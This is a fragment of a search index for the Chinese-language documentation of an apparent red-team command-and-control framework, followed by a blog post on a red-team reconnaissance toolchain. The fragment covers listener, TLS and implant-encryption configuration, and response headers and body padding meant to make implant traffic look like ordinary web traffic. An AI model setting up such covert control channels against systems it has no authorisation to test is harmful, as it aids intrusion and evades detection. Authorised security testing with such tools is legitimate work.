</p>"},{"location":"IoM/manual/manual/listener/#\u65b0\u5efahttp\u5e76\u5f00\u542ftls","title":"\u65b0\u5efahttp\u5e76\u5f00\u542ftls","text":"<pre><code>http --listener listener --host 192.168.110.72 --port 8083 --tls --cert-name DETERMINED_NIECE\n</code></pre> <p> gui: </p>"},{"location":"IoM/manual/manual/listener/#\u65b0\u5efarem","title":"\u65b0\u5efarem","text":"<pre><code>rem new rem_test --listener listener  -c tcp://127.0.0.1:19966\n</code></pre>"},{"location":"IoM/manual/manual/listener/#\u65b0\u5efawebsite","title":"\u65b0\u5efawebsite","text":"<pre><code>website web-test --listener listener --port 5080 --root /web\n</code></pre> <p> gui: </p>"},{"location":"IoM/manual/manual/listener/#\u65b0\u5efawebsite\u5e76\u5f00\u542ftls","title":"\u65b0\u5efawebsite\u5e76\u5f00\u542ftls","text":"<pre><code>website web-test --listener listener --port 5080 --root /web --tls --cert-name GOOD_BEETLE\n</code></pre> <p> gui: </p>"},{"location":"IoM/manual/manual/listener/#\u5728\u5bf9\u5e94website\u4e0a\u4f20\u6587\u4ef6","title":"\u5728\u5bf9\u5e94website\u4e0a\u4f20\u6587\u4ef6","text":"<pre><code>website add /path/to/file --website web-test --path /path\n</code></pre> <p> gui: </p>"},{"location":"IoM/manual/manual/listener/#\u9ad8\u7ea7\u529f\u80fd","title":"\u9ad8\u7ea7\u529f\u80fd","text":""},{"location":"IoM/manual/manual/listener/#\u8bc1\u4e66\u7ba1\u7406","title":"\u8bc1\u4e66\u7ba1\u7406","text":"<p>\u5f53\u524d\u8bc1\u4e66\u7ba1\u7406\u652f\u6301\u901a\u8fc7\u591a\u79cd\u65b9\u5f0f\u914d\u7f6e\u8bc1\u4e66\u3002</p> <ul> <li>\u968f\u673a\u751f\u6210\u81ea\u7b7e\u540d\u8bc1\u4e66</li> <li>\u6307\u5b9a\u53c2\u6570\u751f\u6210\u81ea\u7b7e\u540d\u8bc1\u4e66</li> <li>\u5bfc\u5165\u5df2\u6709\u8bc1\u4e66</li> </ul>"},{"location":"IoM/manual/manual/listener/#\u901a\u8fc7config\u914d\u7f6e\u8bc1\u4e66","title":"\u901a\u8fc7config\u914d\u7f6e\u8bc1\u4e66","text":"<p>\u76ee\u524dconfig.yaml\u4e3b\u8981\u7531TLS\u7684\u76f8\u5173\u914d\u7f6e\u6765\u63a7\u5236\u8bc1\u4e66\u3002\u5177\u4f53TLS\u914d\u7f6e\u5982\u4e0b: <pre><code>tls:  \n  enable: true                    # \u542f\u7528TLS\u52a0\u5bc6\u4f20\u8f93\n  # \u81ea\u7b7e\u540d\u8bc1\u4e66\u914d\u7f6e\n  CN: \"test\"                      # \u8bc1\u4e66\u901a\u7528\u540d\u79f0(Common Name)\uff0c\u901a\u5e38\u4e3a\u57df\u540d\u6216IP\u5730\u5740\n  O: \"Sharp Depth\"                # \u8bc1\u4e66\u7ec4\u7ec7\u540d\u79f0(Organization)\n  C: \"US\"                         # \u8bc1\u4e66\u56fd\u5bb6\u4ee3\u7801(Country)\uff0c\u4f7f\u7528ISO 3166-1\u6807\u51c6\n  L: \"Houston\"                    # \u8bc1\u4e66\u5730\u533a/\u57ce\u5e02\u540d\u79f0(Locality)\n  OU: \"Persistent Housework, Limited\"  # \u8bc1\u4e66\u7ec4\u7ec7\u5355\u4f4d\u540d\u79f0(Organizational Unit)\n  ST: \"State of Texas\"            # \u8bc1\u4e66\u5dde/\u7701\u540d\u79f0(State/Province)\n\n  # \u5bfc\u5165\u8bc1\u4e66\u914d\u7f6e\n  cert_file: path\\to\\cert         # \u8bc1\u4e66\u6587\u4ef6\u8def\u5f84\uff0c\u652f\u6301PEM\u683c\u5f0f\u7684\u8bc1\u4e66\u6587\u4ef6\n  key_file: path\\to\\key           # \u79c1\u94a5\u6587\u4ef6\u8def\u5f84\uff0c\u652f\u6301PEM\u683c\u5f0f\u7684\u79c1\u94a5\u6587\u4ef6\n  ca_file: path\\to\\ca             # CA\u8bc1\u4e66\u6587\u4ef6\u8def\u5f84(\u53ef\u9009)\uff0c\u7528\u4e8e\u9a8c\u8bc1\u5ba2\u6237\u7aef\u8bc1\u4e66\u7684CA\u8bc1\u4e66\n</code></pre></p>"},{"location":"IoM/manual/manual/listener/#\u81ea\u7b7e\u540d\u8bc1\u4e66","title":"\u81ea\u7b7e\u540d\u8bc1\u4e66\uff1a","text":"<p>\u81ea\u7b7e\u540d\u8bc1\u4e66\u914d\u7f6e\u5982\u4e0b\uff0c\u53ea\u9700\u8981\u5c06config.yaml\u4e2d\u9700\u8981\u5bf9\u5e94pipeline\u7684tls\u7684 <code>enable</code> \u8bbe\u4e3atrue\u3002</p> <pre><code>tcp:  \n  - name: tcp  \n    enable: true  \n    port: 5001  \n    host: 0.0.0.0  \n    protocol: tcp  \n    parser: auto  \n    tls:  \n      enable: true  \n    encryption:  \n      - enable: true  \n        type: aes  \n        key: maliceofinternal  \n      - enable: true  \n        type: xor  \n        key: maliceofinternal\n</code></pre> <p>\u5982\u679c\u6709\u81ea\u5df1\u7684\u8bc1\u4e66\u751f\u6210\u4fe1\u606f\uff0c\u53ef\u6309\u4ee5\u4e0b\u914d\u7f6e\u586b\u5199: <pre><code>tcp:  \n  - name: tcp  \n    enable: true  \n    port: 5001  \n    host: 0.0.0.0  \n    protocol: tcp  \n    parser: auto  \n    tls:  \n      enable: true\n      CN: \"test\"\n      O: \"Sharp Depth\"\n      C: \"US\"\n      L: \"Houston\"\n      OU: \"Persistent Housework, Limited\"\n      ST: \"State of Texas\"  \n    encryption:  \n      - enable: true  \n        type: aes  \n        key: maliceofinternal  \n      - enable: true \n        type: xor\n        key: maliceofinternal\n</code></pre></p>"},{"location":"IoM/manual/manual/listener/#\u5bfc\u5165\u5df2\u6709\u8bc1\u4e66","title":"\u5bfc\u5165\u5df2\u6709\u8bc1\u4e66","text":"<p>\u5bfc\u5165\u8bc1\u4e66\u914d\u7f6e\u5982\u4e0b\uff1a <pre><code>tcp:  \n  - name: tcp  \n    enable: true  \n    port: 5001  \n    host: 0.0.0.0  \n    protocol: tcp  \n    parser: auto  \n    tls:  \n      enable: true  \n      cert_file: path\\to\\cert  \n      key_file: path\\to\\key  \n      ca_file: path\\to\\ca    (\u975e\u5fc5\u987b\u586b\u5199)\n    encryption:  \n      - enable: true  \n        type: aes  \n        key: maliceofinternal  \n      - enable: true  \n        type: xor  \n        key: maliceofinternal\n</code></pre></p>"},{"location":"IoM/manual/manual/listener/#client\u914d\u7f6e\u8bc1\u4e66","title":"client\u914d\u7f6e\u8bc1\u4e66","text":"<p>\u542f\u52a8listener\u4e4b\u540e\uff0c\u53ef\u4ee5\u7ed9\u5df2\u6709\u7684pipeline\u4f7f\u7528\u65b0\u7684\u8bc1\u4e66\uff0c\u4f7f\u7528\u65b0\u7684\u8bc1\u4e66\u524d\uff0c\u9700\u8981\u4fdd\u8bc1\u670d\u52a1\u5668\u5df2\u7ecf\u5b58\u50a8\u4e86\u9700\u8981\u7684\u8bc1\u4e66\u3002</p> <p>\u6dfb\u52a0\u81ea\u7b7e\u540d\u8bc1\u4e66</p> <pre><code>cert self_signed\n</code></pre> <p></p> <p>gui:  \u6dfb\u52a0\u5bfc\u5165\u8bc1\u4e66 <pre><code>cert import --cert /path/to/cert --key /path/to/key --ca-cert /path/to/ca\n</code></pre></p> <p>  gui:    \u5982\u679c\u4e0d\u786e\u8ba4\u8bc1\u4e66\u4fe1\u606f\uff0c\u53ef\u4ee5list\u8bc1\u4e66\uff0c\u6765\u786e\u8ba4\u662f\u5426\u662f\u9700\u8981\u7684\u8bc1\u4e66\u3002</p> <pre><code>cert\n</code></pre> <p> gui: </p>"},{"location":"IoM/manual/manual/listener/#\u4f7f\u7528\u6307\u5b9a\u8bc1\u4e66\u542f\u52a8pipeline","title":"\u4f7f\u7528\u6307\u5b9a\u8bc1\u4e66\u542f\u52a8pipeline","text":"<p>\u5f53\u670d\u52a1\u5668\u5df2\u5b58\u50a8\u6240\u9700\u8bc1\u4e66\u540e\uff0c\u53ef\u4ee5\u901a\u8fc7\u4ee5\u4e0b\u547d\u4ee4\uff0c\u5c06pipeline\u4f7f\u7528\u65b0\u7684\u8bc1\u4e66\u914d\u7f6e\u542f\u52a8\u3002</p> <pre><code>pipeline start tcp --cert-name cert-name\n</code></pre> <p></p>"},{"location":"IoM/manual/manual/listener/#parser","title":"Parser","text":"<p>parser \u534f\u8bae\u7528\u6765\u533a\u5206\u5bf9\u5e94\u7684 implant \u7c7b\u578b\uff0cpulse \u4e0e malefic \u76ee\u524d\u7684\u4f20\u8f93\u534f\u8bae\u7565\u6709\u4e0d\u540c\uff0c\u6240\u4ee5parser\u5f53\u524d\u53ef\u8bbe\u7f6e\u503c\u4e3aauto/malefic/pulse\uff0c\u5982\u679c\u4e3aauto\uff0c\u5219\u4f1a\u81ea\u52a8\u533a\u5206pulse\u548cmalefic\u7684\u4f20\u8f93\u534f\u8bae\u3002\u5f53\u9700\u8981\u914d\u7f6e\u4e00\u4e2a pulse \u65f6\uff0c\u9700\u8981\u5355\u72ec\u7684 parser \u914d\u7f6e\u3002\u4ee5\u4e0b\u662fpulse\u914d\u7f6e\u793a\u4f8b:</p> <pre><code>    - name: shellcode\n      port: 5002\n      host: 0.0.0.0\n      parser: pulse    # \u5bf9\u5e94malefic-pulse\u4e0a\u7ebf\n      enable: true\n      encryption:\n        enable: true\n        type: xor\n        key: maliceofinternal\n</code></pre>"},{"location":"IoM/manual/manual/listener/#encryption","title":"Encryption","text":"<p>encryption\u7528\u4e8e\u914d\u7f6e /pipeline \u4e0e implant \u4e4b\u95f4\u7684\u901a\u4fe1\u52a0\u5bc6\u534f\u8bae\u3002 \u5176\u4f5c\u7528\u662f\u5bf9 \u5b8c\u6574\u6570\u636e\u5305\u8fdb\u884c\u52a0\u5bc6/\u89e3\u5bc6\uff0c\u4ece\u800c\u907f\u514d\u660e\u6587\u4f20\u8f93\u88ab\u68c0\u6d4b\u6216\u7be1\u6539\u3002 \u76ee\u524d\u652f\u6301\u7684\u52a0\u5bc6\u7b97\u6cd5\uff1aXOR\u548cAES-CFB\u3002</p> <pre><code>      encryption:\n        - enable: true               # \u662f\u5426\u542f\u7528\u8be5\u52a0\u5bc6\u65b9\u5f0f\n          type: aes                  # \u52a0\u5bc6\u7c7b\u578b (\u652f\u6301: aes / xor)\n          key: maliceofinternal      # \u5bc6\u94a5 (implant \u9700\u4e00\u81f4)\n        - enable: true\n          type: xor\n          key: maliceofinternal  \n</code></pre>"},{"location":"IoM/manual/manual/listener/#http\u81ea\u5b9a\u4e49\u54cd\u5e94\u5185\u5bb9","title":"http\u81ea\u5b9a\u4e49\u54cd\u5e94\u5185\u5bb9","text":"<p>http pipeline\u53ef\u4ee5\u81ea\u5b9a\u4e49\u914d\u7f6e\u5bf9\u5e94\u7684\u54cd\u5e94\u5185\u5bb9,\u53ef\u4ee5\u5728config.yaml\u4e2d\u914d\u7f6e\u3002 <pre><code> http:  \n    - name: http          # http \u540d\u5b57\n      enable: true        # http \u662f\u5426\u5f00\u542f\n      host: 0.0.0.0       # http \u76d1\u542c\u7684host\n      port: 8080          # http \u76d1\u542c\u7684\u7aef\u53e3\n      parser: malefic     # implant\u534f\u8bae\n      tls:                # tls\u914d\u7f6e\u9879,\u7559\u7a7a\u5219\u81ea\u52a8\u751f\u6210\n        enable: true  \n        CN: \"test\"  \n        O: \"Sharp Depth\"  \n        C: \"US\"  \n        L: \"Houston\"  \n        OU: \"Persistent Housework, Limited\"  \n        ST: \"State of Texas\"   \n        cert_file: \"\"  \n        key_file: \"\"  \n        ca_file: \"\"  \n      encryption:\n        - enable: true\n          type: aes\n          key: maliceofinternal\n        - enable: true\n          type: xor\n          key: maliceofinternal\n      headers:                               # \u81ea\u5b9a\u4e49\u54cd\u5e94\u5934 (map[string][]string)\n        Server: [\"nginx/1.22.0\"]\n        Content-Type: [\"text/html; charset=utf-8\"]\n        Cache-Control: [\"no-cache\"]\n      error_page: \"/var/www/error.html\"       # 404/500 \u9519\u8bef\u9875\u9762\u8def\u5f84\n      body_prefix: \"&lt;!-- prefix marker --&gt;\"   # \u6bcf\u4e2a HTTP \u54cd\u5e94 body \u524d\u7f00\u5185\u5bb9 \n      body_suffix: \"&lt;!-- suffix marker --&gt;\"   # \u6bcf\u4e2a HTTP \u54cd\u5e94 body \u540e\u7f00\u5185\u5bb9\n</code></pre> - <code>headers</code>\uff1a     \u53ef\u4ee5\u5b9a\u4e49\u591a\u4e2a HTTP \u54cd\u5e94\u5934\uff0c\u4f8b\u5982\u4f2a\u88c5\u6210 Nginx/Apache\uff0c\u6216\u8005\u8fd4\u56de\u81ea\u5b9a\u4e49\u7684 Content-Type\u3002 - <code>error_page</code>\uff1a     \u6307\u5b9a\u4e00\u4e2a\u6587\u4ef6\u8def\u5f84\u4f5c\u4e3a\u9519\u8bef\u9875\u9762\uff0c\u8fd4\u56de\u65f6\u53ef\u66ff\u4ee3\u9ed8\u8ba4\u7684\u9519\u8bef\u5185\u5bb9\u3002 - <code>body_prefix</code> / <code>body_suffix</code>\uff1a     \u5728 HTTP \u54cd\u5e94\u4f53\u7684\u6700\u524d/\u6700\u540e\u62fc\u63a5\u989d\u5916\u5185\u5bb9\uff0c\u7528\u4e8e\u6df7\u6dc6\u6d41\u91cf\u6216\u4f2a\u88c5\u7f51\u9875\u3002</p>"},{"location":"IoM/manual/manual/listener/#\u72ec\u7acb\u90e8\u7f72listener","title":"\u72ec\u7acb\u90e8\u7f72listener","text":"<p>\u4ece\u9879\u76ee\u8bbe\u8ba1\u5f00\u59cb\uff0c\u6211\u4eec\u5c31\u5c06listener\u548cserver\u89e3\u8026\uff0c\u53ef\u4ee5\u901a\u8fc7\u542f\u52a8\u547d\u4ee4\u72ec\u7acb\u90e8\u7f72listener\u3002 <pre><code>./malice-network --listener-only\n</code></pre></p> <p></p>"},{"location":"blog/","title":"Blog","text":""},{"location":"blog/2022/11/15/asm%E7%9A%84%E8%93%9D%E5%9B%BE/","title":"ASM\u7684\u84dd\u56fe","text":""},{"location":"blog/2022/11/15/asm%E7%9A%84%E8%93%9D%E5%9B%BE/#\u524d\u8a00","title":"\u524d\u8a00","text":"<p>\u5728\u53d1\u5e03chainreactor\u7684\u8ba1\u5212\u4e4b\u524d, \u5148\u884c\u53d1\u5e03\u4e86\u6211\u4eec\u6700\u6210\u719f\u7684\u5de5\u5177 gogo, \u662f\u5e0c\u671b\u5927\u5bb6\u80fd\u4ecegogo\u4e2d\u611f\u53d7\u5230\u6211\u4eec\u7684\u8bbe\u8ba1\u4e0a\u7684\u98ce\u683c. \u63a5\u4e0b\u6765\u5c06\u4f1a\u4ecb\u7ecdchainreactor\u7684\u5176\u4ed6\u90e8\u5206.</p>"},{"location":"blog/2022/11/15/asm%E7%9A%84%E8%93%9D%E5%9B%BE/#\u5f00\u59cb","title":"\u5f00\u59cb","text":"<p>chainreactor \u5c06\u4e13\u6ce8\u4e8e\u7ea2\u961f\u81ea\u52a8\u5316\u4ee5\u53ca\u7ea2\u961f\u5de5\u5177\u5de5\u4ef6\u5316. \u5982\u679c\u8981\u627e\u4e00\u4e2a\u7c7b\u6bd4, \u53ef\u4ee5\u53c2\u8003projectdiscovery. \u786e\u5b9e, \u6211\u4eec\u4e5f\u4ecepd\u53c2\u8003\u501f\u9274\u4e86\u975e\u5e38\u591a\u7684\u4ee3\u7801, \u751a\u81f3\u90e8\u5206\u5de5\u5177\u76f4\u63a5\u79fb\u690d\u4e86pd\u7684\u4ee3\u7801\u4e0epoc.</p> <p>\u4e3a\u4ec0\u4e48\u8981\u5728projectdiscovery\u4e4b\u540e\u518d\u505a\u7c7b\u4f3c\u7684\u4e1c\u897f? \u5f53\u7136\u4e0d\u662f\u4e3a\u4e86\u6210\u4e3a\u4e00\u4e2a\u56fd\u4ea7\u5316\u7684\u514b\u9686pd , \u56e0\u6b64pd\u5df2\u7ecf\u8986\u76d6\u5230\u7684\u573a\u666f\u5c06\u76f4\u63a5\u4f7f\u7528pd\u7684\u5de5\u5177\u94fe\u6216\u8005\u7ed9pd\u63d0\u4ea4pr, \u800c\u4e00\u4e9bpd\u6ca1\u6709\u8986\u76d6\u7684\u573a\u666f\u5c06\u4f1a\u81ea\u884c\u7814\u53d1,\u4f8b\u5982url\u88ab\u52a8\u6536\u96c6\u4e0e\u4e3b\u52a8\u6536\u96c6, \u88ab\u52a8\u6536\u96c6dns\u5386\u53f2\u89e3\u6790\u8bb0\u5f55, \u5f31\u53e3\u4ee4\u7206\u7834\u7b49.</p> <p>\u5f53\u7136, \u8fd9\u4e9b\u5de5\u4ef6\u53ea\u662f\u8ba1\u5212\u7684\u7b2c\u4e00\u9636\u6bb5, \u7b2c\u4e8c\u9636\u6bb5\u5219\u662f\u901a\u8fc7\u5de5\u4ef6\u5316\u7684\u5de5\u5177\u94fe\u5b9e\u73b0\u4e00\u4e2a\u53ef\u7f16\u6392, \u53ef\u62d3\u5c55, \u9ad8\u5ea6\u53ef\u63a7\u7684\u9762\u5411\u7ea2\u961f\u7684\u6846\u67b6. \u5e76\u901a\u8fc7\u6d41\u91cf\u4e2d\u95f4\u4ef6\u5b9e\u73b0\u5c06\u5de5\u5177\u94fe\u62d3\u5c55\u5230\u5185\u7f51. \u7b2c\u4e00\u9636\u6bb5\u4e0e\u7b2c\u4e8c\u9636\u6bb5\u5c06\u4f1a\u540c\u6b65\u8fdb\u884c</p> <p>\u662f\u7684, \u6211\u4eec\u7684\u76ee\u6807\u5c31\u662f\u5b9e\u73b0\u4e00\u4e2a\u8db3\u591f\u5f3a\u5927\u7684, \u9ad8\u53ef\u62d3\u5c55\u7684, \u5206\u5e03\u5f0f\u7684, \u534f\u4f5c\u7684\u4fe1\u606f\u6536\u96c6\u4e0e\u6f0f\u626b\u6846\u67b6. \u8fd9\u4e00\u5806\u8bcd\u62fc\u51d1\u51fa\u7684\u5370\u8c61\u5927\u6982\u5c31\u662f\u8fd9\u4e24\u5e74\u5f88\u706b\u7684\u653b\u51fb\u9762\u7ba1\u7406(ASM), \u5b89\u5168\u81ea\u52a8\u5316\u7f16\u6392\u4e0e\u54cd\u5e94(SOAR), \u6f0f\u626b\u52a0\u4e0aCobaltStrike\u5f0f\u7684teamserver\u7684\u96c6\u5408\u4f53.  \u76ee\u6807\u5f88\u5927, \u4e5f\u8bb8\u4e0d\u80fd\u5b8c\u5168\u5b9e\u73b0, \u56e0\u6b64\u6574\u4e2a\u8ba1\u5212\u7684\u6240\u6709\u7ec4\u6210\u90e8\u5206\u90fd\u5c06\u4ee5\u5de5\u4ef6\u5316\u7684\u5f62\u5f0f\u7f16\u5199, \u5c31\u7b97\u4e0d\u80fd\u5b8c\u6210\u6574\u4e2a\u8ba1\u5212, \u4e5f\u6709\u4e00\u7cfb\u5217\u4e2d\u95f4\u6210\u679c\u53ef\u4ee5\u5355\u72ec\u4f7f\u7528\u5728\u5404\u79cd\u573a\u666f\u4e2d.</p> <p>\u76ee\u524d\u8fd9\u4e2a\u9879\u76ee\u4f7f\u7528\u4e1a\u4f59\u65f6\u95f4\u8fdb\u884c\u4e86\u4e00\u5e74\u591a, \u5b8c\u6210\u4e86\u4e00\u4e24\u4e2a\u6210\u719f\u7684\u5de5\u4ef6, \u4e09\u56db\u4e2a\u7814\u53d1\u4e2d\u7684\u5de5\u4ef6, \u4ee5\u53cademo\u7248\u672c\u7684\u6846\u67b6\u4e0edemo\u7248\u672c\u7684\u6d41\u91cf\u4e2d\u95f4\u4ef6.  \u5c06\u4f1a\u9010\u6b65\u53d1\u5e03, \u6211\u76f8\u4fe1\u6bcf\u4e2a\u5de5\u4ef6\u90fd\u80fd\u505a\u5230\u5e02\u9762\u4e0a\u6700\u5f3a\u6216\u5728\u67d0\u4e9b\u573a\u666f\u4e0b\u6709\u72ec\u7279\u7684\u5730\u65b9.</p>"},{"location":"blog/2022/11/15/asm%E7%9A%84%E8%93%9D%E5%9B%BE/#\u521d\u8877","title":"\u521d\u8877","text":"<p>\u5728\u7ea2\u961f\u573a\u666f\u4e0b, \u6bcf\u62ff\u5230\u4e00\u4e2a\u65b0\u76ee\u6807, \u5c31\u8981\u8fdb\u884c\u53ca\u5176\u7e41\u7410\u7684\u4fe1\u606f\u6536\u96c6\u5de5\u4f5c, \u572820\u5e74\u6700\u521d\u5f00\u59cb\u63a5\u89e6\u7684\u65f6\u5019, \u8fd9\u79cd\u7e41\u7410\u7684\u5de5\u4f5c\u53ef\u4ee5\u5360\u7528\u6574\u4e2a\u6d41\u7a0b\u768480%. \u5230\u540e\u6765, \u5f88\u591a\u4eba\u6478\u7d22\u51fa\u4e86\u7ecf\u9a8c,</p> <p>\u5f53\u6211\u4eec\u5f00\u59cb\u5c1d\u8bd5\u5f00\u53d1\u8fd9\u6837\u7684\u4e00\u4e2a\u5de5\u5177\u65f6, \u6211\u53d1\u73b0\u7adf\u7136\u9664\u4e86pd\u4e4b\u5916, \u5176\u4ed6\u5de5\u5177\u6781\u5c11\u6709\u6ee1\u8db3\u6211\u4eec\u7684\u60f3\u6cd5\u7684.  \u603b\u4f1a\u5728\u5404\u79cd\u5404\u6837\u7684\u5730\u65b9\u51fa\u73b0\u65e0\u6cd5\u89e3\u51b3\u7684\u95ee\u9898, \u800c\u4e3a\u4e86\u89e3\u51b3\u8fd9\u4e9b\u95ee\u9898, \u6211\u4eec\u88ab\u8feb\u5148\u53bb\u5f00\u53d1\u4e86\u4e00\u7cfb\u5217\u5de5\u5177\u94fe.</p>"},{"location":"blog/2022/11/15/asm%E7%9A%84%E8%93%9D%E5%9B%BE/#\u84dd\u56fe","title":"\u84dd\u56fe","text":"<p>\u6211\u4eec\u5df2\u7ecf\u5b9e\u73b0\u4e86\u4e00\u7cfb\u5217\u5de5\u4ef6\u4ee5\u53ca\u4e00\u4e2a\u653b\u51fb\u9762\u6d4b\u7ed8\u5f15\u64ce\u7684demo\u7248\u672c. \u4e0d\u540c\u4e8egithub \u540c\u7c7b\u4ea7\u54c1, \u6211\u4eec\u7684\u5de5\u5177\u9664\u4e86pd\u7684\u90e8\u5206\u5de5\u5177\u94fe\u4e4b\u5916, \u5176\u4ed6\u7684\u5de5\u4ef6\u90fd\u9009\u62e9\u4e86\u81ea\u884c\u7814\u53d1. \u5e76\u4e14, \u91c7\u7528\u4e86\u72ec\u7279\u7684\u5206\u5e03\u5f0f\u8bbe\u8ba1\u4ee5\u53ca\u9ad8\u5ea6\u89e3\u8026\u7684\u6a21\u5757\u5316\u8bbe\u8ba1. \u8ba9\u5de5\u4ef6\u80fd\u72ec\u7acb\u8fd0\u884c, \u81ea\u7531\u7ec4\u5408.</p> <p>\u51e0\u4e2a\u7ec8\u6781\u7684\u76ee\u6807(\u56e0\u4e3a\u65f6\u95f4\u6709\u9650, \u8fd9\u4e2a\u76ee\u6807\u53ef\u80fd\u4f1a\u975e\u5e38\u4e45\u8fdc, \u4f46\u662f\u6211\u4eec\u7684\u5de5\u5177\u94fe\u4f1a\u5148\u884c\u5f00\u6e90)</p> <ol> <li>\u5b9e\u73b0\u81ea\u52a8\u5316\u7684\u4fe1\u606f\u6536\u96c6, \u62d3\u6251\u7ed8\u5236, \u6307\u7eb9\u4e0e\u6f0f\u6d1e\u8bc6\u522b (\u8fd9\u4e00\u5757\u540c\u7c7b\u5de5\u5177\u975e\u5e38\u591a, \u8bf7\u76f8\u4fe1chainreactors\u4f1a\u5e26\u6765\u60ca\u559c)</li> <li>\u7c7b\u4f3ccs\u7684teamserver\u5f0f\u7684\u534f\u4f5c\u534a\u81ea\u52a8\u5316\u5185\u5916\u7f51\u4fe1\u606f\u6536\u96c6, \u6f0f\u6d1e\u626b\u63cf, \u7528\u4ee5\u586b\u8865\u81ea\u52a8\u5316\u7684\u4e0d\u8db3</li> <li>\u8db3\u591f\u5f3a\u7684\u53ef\u62d3\u5c55\u6027, \u7c7b\u4f3c\u6f6e\u6c50\u5e73\u53f0\u7684\u81ea\u52a8\u5316\u5de5\u5177\u7f16\u6392. \u5e76\u4e0d\u5f3a\u5236\u4f7f\u7528\u6211\u4eec\u5f00\u53d1\u7684\u539f\u751f\u7684\u5de5\u5177\u94fe, \u4e5f\u53ef\u4ee5\u81ea\u884c\u6dfb\u52a0\u4e00\u4e9b\u7528\u6237\u81ea\u5df1\u559c\u6b22\u7684\u5de5\u5177</li> </ol> <p>\u8fd9\u4e9b\u601d\u8def\u5728\u63d0\u51fa\u7684\u65f6\u5019\u5e02\u9762\u4e0a\u5e76\u6ca1\u6709\u7c7b\u4f3c\u7684\u4ea7\u54c1, \u4f46\u662f\u95ed\u95e8\u5f00\u53d1\u4e86\u4e00\u5e74\u591a\u4e4b\u540e, \u53d1\u73b0\u5e02\u573a\u4e0a\u5df2\u7ecf\u6709\u8bb8\u591a\u7c7b\u4f3c\u7684\u521b\u4e1a\u516c\u53f8, \u53ea\u80fd\u8bf4\u8fd9\u4e24\u5e74hw\u4e0e\u7ea2\u961f\u7684\u9700\u6c42\u662f\u7c7b\u4f3c\u7684. \u5927\u5bb6\u56e0\u4e3a\u6709\u7c7b\u4f3c\u7684\u9700\u6c42, \u81ea\u7136\u800c\u7136\u7684\u4ea7\u751f\u7684\u7c7b\u4f3c\u7684\u60f3\u6cd5. \u51e0\u4e4e\u6bcf\u9694\u4e00\u4e24\u4e2a\u6708, \u90fd\u4f1a\u6709\u4e00\u4e9b\u6cbe\u6cbe\u81ea\u559c\u7684\u521b\u610f\u4f1a\u6709\u5176\u4ed6\u4eba\u4ee5\u5404\u79cd\u65b9\u5f0f\u516c\u5f00.</p>"},{"location":"blog/2022/11/15/asm%E7%9A%84%E8%93%9D%E5%9B%BE/#\u5de5\u5177\u94fe\u76ee\u524d\u72b6\u6001","title":"\u5de5\u5177\u94fe\u76ee\u524d\u72b6\u6001","text":"<p>\u5de5\u5177\u94fe\u4e0e\u6846\u67b6\u7684\u9700\u6c42\u662f\u76f8\u4e92\u7684, \u5982\u679c\u9700\u6c42\u590d\u6742\u5230\u9700\u8981\u4e00\u4e2a\u5355\u72ec\u7684\u5de5\u5177\u89e3\u51b3, \u90a3\u5c31\u4f1a\u65b0\u5efa\u4e00\u4e2a\u9879\u76ee.</p> <p>\u6211\u4eec\u5c06\u4f1a\u4fdd\u7559pd\u7684\u5927\u90e8\u5206\u5de5\u5177, \u5e76\u5728\u6b64\u4e4b\u4e0a\u5b9e\u73b0pd\u4e2d\u6ca1\u6709\u8986\u76d6\u7684\u573a\u666f. \u8865\u5168\u4e00\u4e2a\u5b8c\u6574\u7684\u5de5\u5177\u94fe.</p> <p>\u5df2\u7ecf\u5728\u8fdb\u884c\u4e2d\u7684\u5de5\u4ef6:</p> <ul> <li>gogo (\u7aef\u53e3\u626b\u63cf, \u6307\u7eb9\u8bc6\u522b, \u7b80\u6613\u6f0f\u6d1e\u626b\u63cf) \u8fdb\u5ea6: \u5df2\u5b8c\u6210</li> <li>zombie (\u5e38\u89c1\u670d\u52a1\u7684\u53e3\u4ee4\u7206\u7834\u4e0e\u55b7\u6d12, \u6279\u91cf\u6267\u884c) \u8fdb\u5ea6:\u91cd\u6784\u4e2d, \u5373\u5c06\u5b8c\u6210</li> <li>spray (\u4e3b\u52a8http\u7206\u7834, \u4e3b\u52a8\u6307\u7eb9\u8bc6\u522b\u7b49http\u534f\u8bae\u9ad8\u5e76\u53d1\u4efb\u52a1) \u8fdb\u5ea6: \u91cd\u6784\u4e2d,\u5373\u5c06\u5b8c\u6210</li> <li>ani  (\u516c\u53f8\u4fe1\u606f\u722c\u866b)  \u8fdb\u5ea6: \u5df2\u5b8c\u6210</li> <li>ina (\u7a7a\u95f4\u641c\u7d22\u5f15\u64ce\u4ea4\u53c9\u722c\u866b) \u8fdb\u5ea6: \u5df2\u5b8c\u6210</li> <li>meta-matrix  (\u5c06\u5de5\u4ef6\u5feb\u901f\u5206\u5e03\u5f0f\u5316\u7684\u6846\u67b6) \u8fdb\u5ea6: \u5df2\u5b8c\u6210</li> <li>maitai (\u6d41\u91cf\u4e2d\u95f4\u4ef6, \u5b9e\u73b0\u4ee3\u7406\u4e0e\u8f6c\u53d1\u4ee5\u53caagent\u7684\u5404\u79cd\u529f\u80fd) \u8fdb\u5ea6: \u91cd\u6784\u4e2d</li> </ul> <p>\u90e8\u5206\u5de5\u4ef6\u56e0\u4e3a\u4e4b\u524d\u5728\u5b9e\u6218\u4e2d\u8fb9\u6253\u8fb9\u5199, \u4ee3\u7801\u8d28\u91cf\u4e0e\u8bbe\u8ba1\u4e0a\u5b58\u5728\u4e00\u4e9b\u95ee\u9898, \u6211\u4eec\u8ba4\u4e3a\u8fd8\u4e0d\u80fd\u591f\u5f00\u6e90, \u6240\u4ee5\u5c06\u5176\u4e2d\u51e0\u4e2a\u5de5\u4ef6\u56de\u7089\u91cd\u9020\u4e86, \u6253\u78e8\u4e00\u6bb5\u65f6\u95f4\u540e\u5c06\u4f1a\u5f00\u653e.</p> <p>\u89c4\u5212\u4e2d\u7684\u5de5\u4ef6:</p> <ul> <li>urlfinder (\u88ab\u52a8url\u6536\u96c6)</li> <li>ipfinder (\u88ab\u52a8\u7684ip\u6536\u96c6)</li> <li>kindred-engine (\u5de5\u4ef6\u7684\u7f16\u6392\u8c03\u5ea6\u5f15\u64ce)</li> </ul>"},{"location":"blog/2022/11/15/asm%E7%9A%84%E8%93%9D%E5%9B%BE/#pd\u5de5\u5177\u94fe","title":"pd\u5de5\u5177\u94fe","text":"<p>\u4ecepd\u4e2d\u83b7\u53d6\u7684\u5de5\u4ef6</p> <ul> <li>httpx (\u4e00\u4e9b\u6279\u91cf\u5316\u7684http\u534f\u8bae\u8bf7\u6c42\u4efb\u52a1\u4e0e\u4fe1\u606f\u63d0\u53d6)</li> <li>dnsx 